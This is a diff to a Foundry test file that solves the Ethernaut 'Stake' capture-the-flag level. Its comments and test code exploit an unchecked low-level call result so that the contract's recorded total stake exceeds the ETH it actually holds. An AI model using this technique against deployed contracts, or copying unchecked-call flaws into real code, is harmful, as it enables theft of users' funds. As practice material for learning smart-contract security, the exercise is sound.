@@ -6,28 +6,37 @@ import "src/openzeppelin-ethernaut/Stake.sol";
 
 import "src/openzeppelin-ethernaut/ERC20Impl.sol";
 
+// 1. address.call() result isn't checked; transferFrom can fail
+// 2. use a second account s.t. instance.totalStaked() > address(instance).balance
 contract StakeTest is Test {
     Stake instance;
     ERC20Impl weth;
-    address alice = makeAddr("alice");
 
     function setUp() public {
         weth = new ERC20Impl("WETH", "WETH");
-        instance = new Stake{value: 1 ether}(address(weth));
+        vm.prank(msg.sender);
+        instance = new Stake{value: 0.002 ether}(address(weth));
     }
 
     function test() public {
-        assertEq(address(instance).balance, 1 ether);
+        assertTrue(ERC20.allowance.selector == 0xdd62ed3e);
+        assertTrue(ERC20.transferFrom.selector == 0x23b872dd);
 
-        vm.startPrank(alice);
-        weth.approve(address(instance), 0.5 ether);
-        instance.StakeWETH(0.5 ether);
-        instance.Unstake(0.5 ether);
+        address alice = makeAddr("alice");
+        vm.startPrank(makeAddr("alice"));
+        weth.approve(address(instance), type(uint256).max);
+
+        uint256 stakeAmount = 0.0015 ether;
+        instance.StakeWETH(stakeAmount);
         vm.stopPrank();
 
-        assertEq(address(instance).balance, 0.5 ether);
-        assertEq(address(alice).balance, 0.5 ether);
-        assertEq(instance.UserStake(alice), 0);
-        assertEq(instance.Stakers(alice), true);
+        weth.approve(address(instance), type(uint256).max);
+        instance.StakeWETH(stakeAmount);
+        instance.Unstake(stakeAmount);
+
+        assertTrue(address(instance).balance > 0);
+        assertTrue(instance.totalStaked() > address(instance).balance);
+        assertEq(instance.Stakers(address(this)), true);
+        assertEq(instance.UserStake(address(this)), 0);
     }
 }
